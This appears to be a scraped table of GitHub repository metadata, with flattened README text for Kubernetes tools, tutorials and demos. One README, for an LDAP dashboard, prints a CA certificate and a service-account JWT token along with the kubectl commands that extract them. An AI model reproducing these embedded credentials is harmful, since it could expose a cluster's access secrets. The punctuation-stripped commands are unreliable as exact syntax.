MOPtRTeG8sw Schedule a K8s Backup https www youtube com watch v CkIVZdmWXiQ Share backup with other clusters https www youtube com watch v tnyNPynPLJI Restores Walkthrough Restoring a Kubernetes cluster https www youtube com watch v Xf0TkzudUF0 Restoring a Kubernetes cluster to another cluster https www youtube com watch v dhBnUgfTsh4 Documentation Get started with CAPE Docs https docs cape sh docs Contribute We welcome contributions from the community Bug reports and feature requests through Github issues https github com cape sh cape issues new Contact Connect with us on our mailing list or Slack https capesh slack com Our Youtube channel https www youtube com channel UCSXtrXokSgbZuSz7qgu3VHw If you like our project Twitter Follow https img shields io twitter follow CapeSuperhero style social and GitHub stars https img shields io github stars cape sh cape style social,2020-06-17T06:06:32Z,2020-10-30T14:21:17Z,n/a,Organization,4,26,2,82,master,thomasyit#debianmaster#joanne-gsl#ShireenB#mooney-biqmind,5,0,0,1,0,1,4
larkintuckerllc,k8s-cka-tutorial,,Certified Kubernetes Administrator CKA Tutorial Addendum After the Videos section below I summarized some test preparation steps that I found useful Core Concepts Understand the Kubernetes Cluster Architecture http img youtube com vi VdkDxGsQhmY 0 jpg https youtu be VdkDxGsQhmY Videos Core Concepts Understand the Kubernetes Cluster Architecture 01 understand the kubernetes cluster architecture Keywords Cluster Node Control Plane etcd Cluster Topology Core Concepts Understand the Kubernetes API Primitives 02 understand the kubernetes api primitives Keywords API Group API Resource Namespace Addons Metrics Server Installation Configuration Validation Install Kubernetes Masters and Node 03 install kubernetes masters and nodes Keywords kubeadm kube api server kube controller manager kube scheduler cloud controller manager kublet kube proxy etcd Security Know How to Configure Authentication and Authorization 04 know how to configure authentication and authorization Keywords Authentication Authorization Adminission Control Transport Security User Client Certificate Authentication Security Know How to Configure Authentication and Authorization 05 know how to configure authentication and authorization Keywords AWS Authentication Role Based Access Control Authorization Rules ClusterRole RoleBinding ClusterRoleBinding Security Know How to Configure Authentication and Authorization 06 know how to configure authentication and authorization Keywords ConfigMap Role Core Concepts Understand the Kubernetes API Primitives 07 understand the kubernetes api primitives Keywords Metadata Labels Annotations spec status Imperative Commands Imperative Object Configuration Declarative Object Configuration Core Concepts Understand the Kubernetes API Primitives 08 understand the kubernetes api primitives Keywords Helm Core Concepts Understand the Kubernetes API Primitives 09 understand the kubernetes api primitives Keywords Kustomize Application Lifecycle Management Know Various Ways to Configure Applications 10 know various ways to configure applications Keywords Pod Container Pod Event Pod Status Phase Pod Condition Container State Container Environment Application Lifecycle Management Know Various Ways to Configure Applications 11 know various ways to configure applications Keywords Container Lifecycle Hook Probe readinessGates Networking Understand Pod Networking Concepts 12 understand pod networking concepts Keywords Container Logs Intra Pod Networking Inter Pod Cluster Networking Intra Pod IPC Application Lifecycle Management Understand the primitives necessary to create a self healing application 13 understand self healing application Keywords ReplicaSet Horizontal Pod Autoscaler Application Lifecycle Management Understand the primitives necessary to create a self healing application 14 understand self healing application Keywords Deployment DaemonSet StatefulSet Application Lifecycle Management Understand Deployments and How to Perform Rolling Update and Rollbacks 15 understand deployments Keywords Deployment Revision Job CronJob Core Concepts Understand Services and other Network Primitives 16 understand services Keywords Service ClusterIP Endpoints Service Mode Container Network Interface CNI Deploy and Configure Network Load Balancer 17 network load balancer Keywords LoadBalancer NodePort ExternalName Headless Service Networking Know How to Configure and Use the Cluster DNS 18 configure and use cluster dns Keywords CoreDNS kube dns Pod DNS Policy Pod DNS Config Security Create and Manage TLS Certificates for Cluster Components 19 create manage tls certificates Keywords Certificate Authority CertificateSigningRequest Networking Know How to Use Ingress Rules 20 know how to use ingress rules Keywords Ingress Controller Ingress Security Know How to Configure Network Policies 21 know how to configure network policies Keywords Network Policy Storage Understand Kubernetes Storage Objects 22 understand kubernetes storage objects Keywords PersistentVolume PersistentVolumeClaim StorageClass Scheduling Use Label Selectors to Schedule Pods 23 use label selectors to schedule pods Keywords nodeName nodeSelector nodeAffinity podAffinity podAntiAffinity Scheduling Use Label Selectors to Schedule Pods 24 use label selectors to schedule pods Keywords Taint Toleration Logging Monitoring Manage Application Logs 25 manage application logs Keywords Sidecar Container fluentd Node Agent Logging Monitoring Manage Cluster Component Logs 26 manage cluster component logs Keywords Logging Monitoring Understand How to Monitor All Cluster Components 27 understand how to monitor all cluster components Keywords Metrics Server Dashboard Prometheus Security Secure Persistent Key Value Store 28 secure persistent key value store Keywords ConfigMap Secret Security Know How to Configure Authentication and Authorization 29 know how to configure authentication and authorization Keywords ServiceAccount Scheduling Understand How Resource Limits Can Affect Pod Scheduling 30 understand resource limits Keywords Resource Request Resource Limits Scheduling Understand How Resource Limits Can Affect Pod Scheduling 31 understand resource limits Keywords QoS Class PriorityClass Scheduling Understand How Resource Limits Can Affect Pod Scheduling 32 understand resource limits Keywords LimitRange ResourceQuota Security Define Security Context 33 define security contexts Keywords securityContext PodSecurityPolicy Cluster Maintenance Understand Kubernetes Cluster Upgrade Process 34 understand kubernetes cluster upgrade process Keywords kubeadm etcdctl Security Work with Images Securely 35 work with images securely Keywords imagePullSecrets Installation Configuration Validation Configure a Highly Available Kubernetes Cluster 36 configure a highly available k8s cluster Keywords kubeadm Test Preparation While it has an unusual URL I found the Kubernetes Exam Simulator https killer sh well worth the money Also as you can use the official Kubernetes documentation during the exam it is important to be able to navigate it quickly The assumption is that you already know the theory but need to use the documentation to remember the specific configuration syntax As a exercise I went back to each section and added my thoughts on how to find the relevant configuration syntax In the interest of time there are a number of things to know off the top of your head Misc Not kubectl Create time saving CLI shortcuts alias k kubctl and do dry run client o yaml Get status and logs from Node service kublet and docker systemctl type service systemctl status XXXXX and journalctl u XXXXX Extract text out of certificates openssl x509 text in XXXX Retrieve iptables on a Node iptables save Misc kubectl note Can use ranges in CLI i e 1 3 Copy files to a container k cp help Delete resources k delete XXXXX XXXXX to return quickly from Pod deletion use wait false Label resources k label XXXXX XXXX Annotate resouces k annotate XXXXX XXXXX Validate authorization k auth can i XXXXX XXXXX as XXXXXX as group XXXXX General options e g as XXXXX k options Inspection Manipulate the kubectl configuration file k config view k config use context XXXXX Get API groups resource k api versions and k api resources o wide Get application centric resources from a namespace k get all n XXXXX o wide Run temporary Pod to hit a URL k run tmp restart Never rm image busybox it wget O T 3 XXXXX Create configuration file from live resource k get XXXXX XXXXX o yaml Login to a Pod k exec XXXXX it sh Learn to use basic JSONPath JSONPath Support https kubernetes io docs reference kubectl jsonpath often helpful in getting specific summary information from an array of objects Learn to sort results principally by time e g sort by metadata creationTimestamp Imperative Creation note Need to pay attention to namespaces i e supply the n XXXXX option to add namespace to configuration file after generating it with do option note Also the help option is super helpful here Create a Pod k run XXXXX image XXXXX Create a Namespace k create namespace XXXX Create a Deployment k create deployment XXXXX image XXXXX Create a Service k expose deployment XXXXX port XX target port XX Create an Job CronJob k create help Deployment Manipulation History k rollout history deployment XXXXX Status k rollout status deployment XXXXX revision X Undo k rollout undo deployment XXXXX to revision X Pause k rollout pause deployment XXXXX Set Image k set image help Autoscale k autoscale help Script First a disclaimer These videos were made as part of my preparation for the CKA certification exam The material is organizied around the official curriculum Open Source Curriculum for CNCF Certification Courses https github com cncf curriculum This tutorial is very different than your typical K8s tutorial e g Tutorials https kubernetes io docs tutorials Those tutorial get to the fun stuff e g Pods containers etc at the start This is more appropriate for a first taste of K8s This tutorial however starts with more of the fundamentals e g cluster topology authentication etc The thinking here is that you already know you want to learn K8s While the official curriculum provided the organization the bulk of the content comes from the K8s concepts section Concepts https kubernetes io docs concepts Finally there are also a number of K8s preparation course available most were around 300 or so that you might find valuable Without naming names I was fairly unsatisfied with the one that I took and thus was born this tutorial I needed more hands on practice,2020-05-02T10:06:46Z,2020-11-24T09:33:30Z,HCL,User,8,25,19,271,master,larkintuckerllc,1,0,0,2,0,2,0
figaw,configuration-as-code-jenkins-k8s,,Configuration as Code of Jenkins for Kubernetes Demo resources for the Configuration as Code of Jenkins for Kubernetes talk on the 21st of April for the Jenkins Online Meetup group Meetup Details Slides The slides from the presentation is available in handout format in configuration as code jenkins k8s pdf in this repository Video You can find the recording on YouTube https youtu be KB7thPsG9VA Demo Resources Credentials 1 Generate an ssh keypair called githubidrsa 1 Use the public key on your GitHub service account bot user See Machine Users on Managing Deploy Keys https developer github com v3 guides managing deploy keys machine users for more information 1 Put the private key in the resources folder and use it when runnin the advanced jcasc examples or creating Jenkins with Helm Folders basic jenkins in docker How to run a basic Jenkins in Docker for doing the JobDSL demo jcasc Files for running our JCasC in Docker jobdsl JobDSL demo files k8s Files for running our Jenkins in K8s resources Common configuration files used by the examples Compainion Repositories JobDSL Seed Job repository Example Project repository,2020-04-19T15:50:23Z,2020-12-02T13:21:04Z,Groovy,User,4,25,24,12,master,figaw#oleg-nenashev,2,0,0,1,0,1,1
rabbitmq,diy-kubernetes-examples,examples#k8s#kubernetes#rabbitmq,DIY RabbitMQ on Kubernetes This directory contains examples that demonstrate minimalistic RabbitMQ cluster https www rabbitmq com clustering html deployments on Kubernetes with Kubernetes peer discovery https www rabbitmq com cluster formation html There are several examples An extensive one that targets the Google Kubernetes Engine GKE gke originally contributed by Feroz Jilla A basic one that targets Minikube minikube Another basic one that targets Kind kind originally contributed by Gabriele Santomaggio For a more comprehensive open source RabbitMQ on Kubernetes deployment solution see RabbitMQ Cluster Operator for Kubernetes https www rabbitmq com kubernetes operator operator overview html The Operator is developed on GitHub https github com rabbitmq cluster operator and contains its own set of examples https github com rabbitmq cluster operator tree master docs examples Production Non Suitability Some values in these example files may or may not be optimal for your deployment There are many aspects to deploying and running a production grade cluster on Kubernetes that this example cannot know or make too many assumptions about Persistent volume configuration is one obvious examples You are welcome and encouraged to expand the example by adding more files under the examples environment directory We assume that the users of this plugin familiarize themselves with the RabbitMQ Peer Discovery guide https www rabbitmq com cluster formation html RabbitMQ Production Checklist https www rabbitmq com production checklist html and the rest of RabbitMQ documentation https www rabbitmq com documentation html before going into production Having metrics https www rabbitmq com monitoring html both of RabbitMQ and applications that use it is critically important when making informed decisions about production systems Copyright and License Released under the Mozilla Public License 2 0 https www mozilla org en US MPL 2 0 c VMware Inc or its affiliates 2020,2020-08-07T14:37:33Z,2020-12-25T20:34:05Z,Makefile,Organization,6,25,22,18,master,michaelklishin#ansd#Gsantomaggio#lisimia#MirahImage#TorbenKoehn,6,0,0,0,2,0,5
ShaoNianyr,boomer_locust,,Boomerlocust Distributed pressure measurement for docker k8s Using Boomer locust with prometheues and grafana View testerhome for more details https testerhome com topics 24828 Contact me on QQ group 552643038 Usage HTTP HTTPS To run http https examples get code git clone git github com ShaoNianyr boomerlocust git cd boomerlocust run server with docker compose docker compose up d view your urls locust http localhost 8089 Success httpSucc httpSucc png Set slave targetUrl locust slave1 image shaonian locust slave latest command target master host locust master master port 5557 url http flask demo 5000 You can set the targetUrl by using url TargetUrl in docker is combined by imagename and port TargetUrl in k8s is combined by svcname namspace and port gRPC To run grpc examples get code git clone git github com ShaoNianyr boomerlocust git cd boomerlocust grpc run server with docker compose docker compose up d view your urls locust http localhost 8089 Success grpcSucc grpcSucc png Set slave targetUrl and targetData locust slave1 image shaonian locust slave rpc latest command helloworld pb master host locust master master port 5557 url grpc demo 50051 data name world You can set the targetUrl and targetData by using url and data TargetUrl in docker is combined by imagename and port TargetUrl in k8s is combined by svcname namspace and port Grafana If you need grafanaplease uncomment the following codes in your docker compose yml prometheus image prom prometheus volumes prometheus yml etc prometheus prometheus yml prometheus data root prometheus prometheus data links locust master ports 9090 9090 grafana image grafana grafana volumes grafana data var lib grafana links prometheus ports 3000 3000 Grafana Dashboard newGrafana newGrafana png Detail For more detail view testerhome https testerhome com topics 24828 Contributing locust https github com locustio locust boomer https github com myzhan boomer License Open source licensed under the MIT license see LICENSE file for details,2020-06-19T03:28:42Z,2020-12-25T06:41:15Z,Python,User,3,24,7,21,master,ShaoNianyr,1,0,0,0,0,0,0
teleskopeView,teleskope_k8s,,Give your devs and product managers an inside view of the cluster Hits https hits seeyoufarm com api count incr badge svg url https github com teleskopeView teleskopek8s Reasoning If you ever feel tired of answering over and over to questions like Which version is on the staging env or when was the last deploy to canary or how many pods are running in the qa env then this project is for you just deploy the Helm chart and let devsproduct managers find the answers themselves so you can focus on doing the fun stuff Getting Started The easiset way to deploy teleskope is with helm shell git clone git github com teleskopeView teleskopek8s git cd chart kubectl create ns teleskope helm install name teleskope f example yaml Deploying teleskope with HelmRelease apiVersion helm fluxcd io v1 kind HelmRelease metadata name teleskope namespace default annotations fluxcd io automated true fluxcd io tag backend glob sha spec releaseName teleskope helmVersion v3 chart git git github com axel springer kugawana y2devopsutils git path charts master ref master values common lables common labels namespace teleskope backend enabled true image idobry teleskopebackend sha ec71349 command teleskopebackend run replicas 1 hpa enabled false env name PORT value 3000 service port 3000 targetPort 3000 ingress enabled true hosts host teleskope io paths ns dep list ws frontend enabled true image efrat19 teleskope frontend amd64 22f456a1de2636b182e11e16781ee0f84cdddfa1 env name VUEAPPWSENDPOINT value ws teleskope io ws service port 80 targetPort 80 ingress enabled true hosts host teleskope io paths Continued Development Basically a roadmap Coming soon Maybe in the future if people want it Support for Daemonsets objects Probably in the future Support for multi containres in a pod Support for Statefulsets objects Built With go https golang org Programing language vue js https vuejs org Frontend framework docker https www docker com Containerized with docker helm https www helm sh Packaged with helm Contributing Code contributions are very welcome Authors Ido Braunstain https github com idobry Initial work Efrat Lavitan https github com efrat19 Initial work Special Thanks Tal Goldberg https github com Talg123 CSS help,2020-05-26T18:00:40Z,2020-10-03T22:55:21Z,Smarty,Organization,1,24,3,61,master,idobry#Efrat19,2,0,0,0,0,0,0
icyxp,kubernetes-dashboard-ldap,,logo png https raw githubusercontent com icyxp kubernetes dashboard ldap master assets images logo png Origin Why write such a tool This is because we have more than one kubernetes cluster 8 The apiserver configuration cannot be modified because it is hosted in the cloud it will bring us a pain points development sre need to login to k8s dashbaord and requires a different between different departments and role authorization the original is through sa token log in dashboard but as the growth of the k8s cluster each adding a cluster you need to inform use corresponding dashboard access addresses and corresponding token This is painful for both the provider and the user Is there a tool that provides a unified address and access to multiple cluster Dashboards After some searching it is found that there is no Most of the solutions in the market are single cluster integration LDAP solutions mainly DEX solutions but the unified login authorization scheme of single cluster alone makes people feel very difficult Aren t there simple and convenient tools for us to use Well I m going to build a tool like this Dashboard LDAP integration solutions https k2r2bai com 2019 09 29 ironman2020 day14 https k2r2bai com 2019 09 29 ironman2020 day14 https blog inkubate io access your kubernetes cluster with your active directory credentials https blog inkubate io access your kubernetes cluster with your active directory credentials The above two documents are LDAP scheme I feel good for the need of people reference How to design Objective Simple use By accessing the same address the dashboard of different clusters can be switched using LDAP login and different cluster permissions can be configured separately With the above goals how to achieve them The implementation method is actually very simple First write a login interface to communicate with the company s AD to obtain users and groups and then associate the users or groups with the service account in the k8s cluster to realize the corresponding rbac and login token After logging in you can complete a reverse proxy service Is it very simple Implementation Technology Stackgolang ginclient goviperldap Kubernetes Dashboard https github com kubernetes dashboard Kuboard https kuboard cn install install dashboard html How to deploy Prerequisites Before using this tool you need to have the following conditions 1 Dashboard has been deployed in each k8s cluster and can be accessed by this tool 2 Already have ldap and have administrative rights to access operations 3 Corresponding service accounts can be mapped in each cluster If you need to have different operation permissions for different users and groups you can authorize sa for rbac which will be explained in detail below 4 This tool needs to operate the APIs of each cluster so you need to obtain the apiserver address ca crt and token of each cluster for configuration As for the ca crt and token of each cluster if you get it Will be explained later How to get ca crt and token This tool needs to operate the API of each cluster to obtain the corresponding sa and token so it needs to have permission to operate each cluster How to generate corresponding CA certificates and tokens in each cluster The answer is to create an sa and give certain permissions Execute the following yaml file in each k8s cluster yaml apiVersion v1 kind ServiceAccount metadata name mutiboard ldap namespace default apiVersion rbac authorization k8s io v1 kind ClusterRoleBinding metadata name mutiboard ldap crb roleRef apiGroup rbac authorization k8s io kind ClusterRole name mutiboard ldap view subjects kind ServiceAccount name mutiboard ldap namespace default apiVersion rbac authorization k8s io v1 kind ClusterRole metadata name mutiboard ldap view rules apiGroups resources serviceaccounts secrets verbs get list apiGroups resources namespaces verbs get list watch The meaning of this yaml file create an sa named mutiboard ldap and give get and list permissions to serviceaccounts and secrets Get the ca crt of mutiboard ldap bash aws local default echo kubectl get secret kubectl get secret grep mutiboard ldap awk print 1 o go template index data ca crt base64 d BEGIN CERTIFICATE MIICyDCCAbCgAwIBAgIBADANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwprdWJl cm5ldGVzMB4XDTE5MDEyNTEwMTgzNFoXDTI5MDEyMjEwMTgzNFowFTETMBEGA1UE AxMKa3ViZXJuZXRlczCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMmc TW0stLLP M6Pc9wpRgZufg6eQ7puBfbYgik20QlO4LFtocgNUDa0y aSXjxheA2C A o9wW0IC3GHQHKgeFY8KXIJu6wM0TO JNQy5XZAWfbsLeXU sLhKuWET KJzVWT 0uBE GCADAAQIec1oQXMbQ551hU5gBFcr67NXHpa2qwEGA1mGtZ7ztmW4 IFUD74 G166z4AOgmR4YWxBs 8NhfWudFD32xevBfSKuHRxRGG5dtffY8QnRbnrmy70HE5 yzLtBvAGfCwtHLTP2ngCAnn2Fb6IeMdIYGpI1544ZjRbzT1YIWsG1v3dlu6tvK1q X5Pj UTDmJuf2SW52A0CAwEAAaMjMCEwDgYDVR0PAQH BAQDAgKkMA8GA1UdEwEB wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAKE2hV0DIG8fSf4 eOi5R2sPRfBW qTwgZDDT9dxZNhbxEInALdruwRUbKRpwaUBOGVpIlaK3 rZkAfjUwoDJ J4fmmCX w3ySrYFjx6tqVFqCPjDkBHh4xpMwUlvsvryRuCEQUQgjqBvj6sWm9GERF2n3VYBF S8bjsQQAZJoE4W OKchlEoSFlKhxAoeZx9CD3Rxnhj2og6doVoGCUqAMh4WZWX w pENnui6M96SysH3SkrA02RXWTGeKzK4E6Av3IG 2a2hauHorbqVfaM6HeL3hkU B JCWpOgN3T4Fw7E359CBQxnSHPasmZ5VBoyIk HUU6ZlMK6Xo6JlbS7ZvVl4 END CERTIFICATE Get the token of mutiboard ldap bash aws local default echo kubectl get secret kubectl get secret grep mutiboard ldap awk print 1 o go template data token base64 d eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9 eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6Im11dGlib2FyZC1sZGFwLXRva2VuLWJ3NWdmIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6Im11dGlib2FyZC1sZGFwIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMjVmZjI4MGQtYWJhMi0xMWVhLWFlOGEtMDIzOTBjMzcyNzhlIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6bXV0aWJvYXJkLWxkYXAifQ q14hqEu2p70YczDviR6c8McDM5vfnKPzjO9usCsC uQUxciBbuJUPK9j3uawppUNlrs3rAPrZIGUS7Jv14rifEXpGxIIfGR6n8 le0b 9YvMZCgs9 jhf 1r01EAnZFh6gcXfxESFguFQI0vYOsX4P2LQvZ9XTMzsqXbW3KGYao5elAjCE4e8Rg4 9ezU8NGTEycsvUMxP 9p0SaAzn9Iak3saZtAnzJq5hkSf1t7l2CgEsYN 3b7uGpHupKzdgAeOflj9ze4Cz2YScv5eixwVXJ RcI4lgSFCgt5yzSbnIuHgxRZyN3NcYLrSBYKftezZysWm3jELgLPogQ At this point the ca crt and token of each cluster have been obtained The following will tell how to configure and use these ca crt and token SA RBAC example yaml apiVersion v1 kind ServiceAccount metadata name ops admin namespace default labels kubernetes io cluster service true addonmanager kubernetes io mode Reconcile apiVersion rbac authorization k8s io v1beta1 kind ClusterRole metadata name ops role rules apiGroups resources namespaces verbs get list watch kind ClusterRoleBinding apiVersion rbac authorization k8s io v1beta1 metadata name ops listnamespace roleRef Referenced role kind ClusterRole name ops role apiGroup rbac authorization k8s io subjects principal part kind ServiceAccount name ops admin namespace default kind RoleBinding apiVersion rbac authorization k8s io v1beta1 metadata name ops ci admin namespace ops ci roleRef Referenced role kind ClusterRole name admin apiGroup rbac authorization k8s io subjects principal part kind ServiceAccount name ops admin namespace default kind RoleBinding apiVersion rbac authorization k8s io v1beta1 metadata name ops qa admin namespace ops qa roleRef Referenced role kind ClusterRole name admin apiGroup rbac authorization k8s io subjects principal part kind ServiceAccount name ops admin namespace default The meaning of this YAML is create an ops admin sa and give this sa two namespace ops ci ops qa admin permissions For more information about rbac please refer to https www cnblogs com wlbl p 10694364 html https www cnblogs com wlbl p 10694364 html LDAP description Our ldap directory rules are as follows domain company subsidiary department user The corresponding Distinguished Name is shown below CN Peng Xu OU department OU subsidiary OU company DC corp DC xxx DC com Here I will get the first OU as a group if your needs are different from mine you can give me an issue to adapt For details please refer to https blog poychang net ldap introduction https blog poychang net ldap introduction Configmap yaml configuration instructions yaml ldap addr ldap 192 168 3 81 389 adminUser xxxxx adminPwd xxxxxx baseDN dc corp dc patsnap dc com filter objectClass person sAMAccountName s attributes userdn orgUnitName OU mapping of global users user groups to SA rbac DevOps team sa ops admin ns kube system xupeng sa inno admin ns default clusters Cluster alias the key displayed in the login drop down box this alias needs to correspond to the key names of ca crt and token in secret sh local apiserver address can be accessed by the current tool apiServer apiserver dev jiunile com port 6443 kubernetes dashboard address can be accessed by the current tool dashboard dashboard dev jiunile com Cluster description the name displayed in the login drop down box desc Dev Cluster Segmentation for individual clusters rbac DevOps team sa admin ns kube system xupeng sa ops admin ns default cnrelease apiServer apiserver cn release jiunile com port 443 dashboard https dashboard cn release jiunile com desc CN Release Cluster usrelease apiServer apiserver us release jiunile com port 443 dashboard https dashboard us release jiunile com desc US Release Cluster euprod apiServer apiserver eu prod jiunile com port 443 dashboard https dashboard eu prod jiunile com desc EU Prod Cluster dataprod apiServer apiserver data prod jiunile com port 443 dashboard http kuboard data prod jiunile com desc DATA Prod Cluster type kuboard Deploy 1 Modify and deploy deploy configmap yaml 2 Write the ca crt and token obtained by each cluster to the corresponding deploy token 3 Execute the secret sh script under deploy sh deploy secret sh Note The xx in xxtoken xxxca crt in secret sh corresponds to the cluster alias in configmap yaml which must correspond one to one 1 deploy deploy deployment yaml Visit http nodeip 31000 mutiboard ldap http img youtube com vi ILiviSLbSq8 0 jpg http www youtube com watch v ILiviSLbSq8 kubernetes muti dashboard ldap login Video download address https github com icyxp kubernetes dashboard ldap raw master assets video intro webm https github com icyxp kubernetes dashboard ldap raw master assets video intro webm Donation if you are willing to Alipay Wxpay Wechat group alipay https raw githubusercontent com icyxp kubernetes dashboard ldap master assets donate alipay png weixin https raw githubusercontent com icyxp kubernetes dashboard ldap master assets donate wxpay png https raw githubusercontent com icyxp kubernetes dashboard ldap master assets donate dyh png,2020-06-11T01:50:04Z,2020-12-16T06:11:03Z,Shell,User,1,23,9,26,master,icyxp,1,2,2,0,5,0,0
Efrat19,kubeload,,Kubeload Hits https hits seeyoufarm com api count incr badge svg url https github com Efrat19 kubeload What is it This operator is a layer above kubernetes jobs that allows you to manage them in much easier and IAC oriented way I came up with the idea when load testing my site using k8s job because I manually had to increase the load every time this operator will let you configure your load test initial load max load interval and hatch rate and most important be able to reproduce the exact same load test over and over again Installation Apply the CRD console kubectl apply f https raw githubusercontent com Efrat19 kubeload master crd yaml Usage Customize your load manager yaml apiVersion kubeload kubeload efrat19 io v1 kind LoadManager metadata name loadmanager sample spec loadSetup With how many pods the load should start initialLoad 2 How much time to wait before increasing the pod count interval 1m How many pods should be added on each interval hatchRate 2 The manager will stop increasing the pods count once hitting maxLoad maxLoad 8 selector Only jobs that has this set of labels will be controlled by this manager matchLabels app load test Once the above load manager will be applied all jobs with the label app load test will be updated with pod count 2 the initialRate than every 1m the interval the loadmanager will increase the pod count by 2 more pods the hatchRate until reaching 8 pods maxLoad Annotations Any time you can annotate controlled jobs with kubeload efrat19 io freeze the load manager will not increase the pods count as long as this annotation is set to true For example to freeze a job console k annotate job load test kubeload efrat19 io freeze true To unfreeze console k annotate job load test kubeload efrat19 io freeze Examples apply an example job and behold the results yaml apiVersion batch v1 kind Job metadata name load test namespace kubeload labels app load test annotations kubeload efrat19 io freeze true spec parallelism 1 template spec containers name load test image efrat19 locust test latest command locust host https www zdnet com no web c 1 r 1 restartPolicy Never Metrics in addition to regular go metrics the operator also exports a custom metric kubeloadloadvolume Type Gauge Description specifies pod count on a given time Labels job namespace Roadmap contributions are accepted hearteyes X build CI X Documentation X Example Helm chart X Export Metrics Grafana Dashboard Tests Local Build console make install make run Built With kubebuilder https book kubebuilder io quick start html,2020-08-09T15:35:39Z,2020-11-10T10:12:42Z,Go,User,2,23,2,55,master,Efrat19,1,7,9,2,0,0,0
Yu-HaoYu,Ferryman,,Ferryman https img shields io github workflow status Yu HaoYu Ferryman Ferryman https github com Yu HaoYu Ferryman actions query workflow 3AFerryman nbsp nbsp https img shields io badge platform Linux blue nbsp nbsp Python 3 7 https img shields io badge Python v3 7 blue nbsp nbsp https img shields io badge Docker v17 03 0 blue nbsp nbsp https img shields io github license Yu HaoYu Ferryman color red https github com Yu HaoYu Ferryman blob master LICENSE 8195 8195gcr ioK8sK8squay iodocker io2 3 8195 8195 Tag Tag docker iodocker io gcr io quay io docker io GitHub Actions6 history txt k8s gcr io kube proxy k8s gcr io kube scheduler k8s gcr io kube controller manager k8s gcr io kube apiserver k8s gcr io etcd k8s gcr io coredns k8s gcr io pause k8s gcr io kubernetes dashboard amd64 k8s gcr io metrics server amd64 k8s gcr io ingress nginx controller k8s gcr io descheduler descheduler quay io coreos flannel quay io kubernetes ingress controller nginx ingress controller quay io coreos kube state metrics v1 9 7 docker io kubernetesui dashboard docker io jenkins jenkins docker io jenkinsci blueocean docker io sonatype nexus3 docker io library docker docker io gitlab gitlab ce docker io gitlab gitlab runner docker io jumpserver jmsall docker io library sonarqube docker io library traefik docker io library nginx docker io library tomcat docker io library openjdk docker io library mysql docker io library redis docker io jettech kube webhook certgen docker io library busybox k8s gcr io registry cn shenzhen aliyuncs com kubernetesaliyun image tag quay io registry cn shenzhen aliyuncs com quayioaliyun image tag docker io registry cn shenzhen aliyuncs com dockerioaliyun image tag docker pull k8s gcr io pause 2 0 docker pull registry cn shenzhen aliyuncs com kubernetesaliyun pause 2 0 ferryman py items yml limit 9999 history 1 ferryman py shell targetauth username Your username password Your password shell export TARGETUSER Your username export TARGETPASSWORD Your password 2 items yml target yaml kube apiserver source k8s gcr io target registry cn shenzhen aliyuncs com kubernetesaliyun 3 history 4 python ferryman py 2020 05 10 2020 05 11 docker pypush 2020 05 17 1 GWF https s1 ax1x com 2020 05 15 YrIXXq png https github com deislabs oras https github com containers skopeo https github com containers image https github com AliyunContainerService image syncer,2020-05-10T10:28:17Z,2020-12-29T01:20:51Z,Python,User,1,23,9,551,master,Yu-HaoYu,1,0,2,0,1,0,0
doitintl,ClusterCloner,,Cluster Cloner Reads the Kubernetes clusters in one location optionally filtering by labels and clones them into another or just outputs JSON as a dry run to from AWS GCP and Azure Article The Cluster Cloner project is discussed in this article https blog doit intl com you can handle the pods but what about the clusters 486fbdb5345d and the different cluster models are compared Usage For usage run clustercloner help Setup Add Credentials in local development environment Add a file credentials cluster manager json or another file name with credentials for a service account with the Kubernetes Cluster Admin role to read and create clusters This is loaded through the GOOGLEAPPLICATIONCREDENTIALS environment variable which you should set to credentials cluster manager json or other file name If this environment variable is not set your logged in gcloud account will be used Add a file env with Azure credentials Use env tpl as a template The user should have the Azure Kubernetes Service Cluster Admin Role Add a file awscredentials with AWS credentials The application uses the AWSSHAREDCREDENTIALSFILE environment variable to find this file but awscredentials is the default Use awscredentials tpl as a template The user should have the policy discussed here https docs aws amazon com eks latest userguide securityiamid based policy examples html Specific example here https github com weaveworks eksctl issues 204 issuecomment 631630355 Define Secrets for GitHub Continuous Integration Not needed for local build Store the base 64 encodings for example echo my credential json base64 For GitHub CI please specify the following Secrets in GitHub AZENVBASE64 env file with Azure credentials for the application following env tpl as a template AWSCREDENTIALSBASE64 AWS credentials file for the application Use awscredentials tpl as a template GCPCLUSTERMANAGERKEYJSONBASE64 Google credentials file JSON for the application GCRPUSHERKEYJSONBASE64 Google credentials file JSON with role Storage Admin for pushing to your GCR registry DOCKERREGISTRY Registry to which the GitHub action with authenticate for example gcr io DOCKERREPOSITORY optional For example gcr io my gcp project image name If missing the value defaults to GITHUBREPOSITORY in the form user repo Building Docker Docker The Docker image is built in Github Workflows In development you can run DOCKERBUILDKIT 1 docker build t Don t forget that final dot Using make In the GitHub actions make is used to build the application In development Build Plain make to format lint and build Lint and format make lint and make fmt Unit tests make test short Integration and unit tests make test Before running make sure that your Google Project and Azure Group are set up see Credentials above and have the same name The full suite can take up to an hour Credits This project was started from the goapp https github com alexei led goapp template a bootstrap project for Go CLI applications,2020-06-07T14:15:24Z,2020-12-09T09:30:51Z,Go,Organization,6,23,3,119,master,JoshuaFox,1,2,2,0,0,0,0
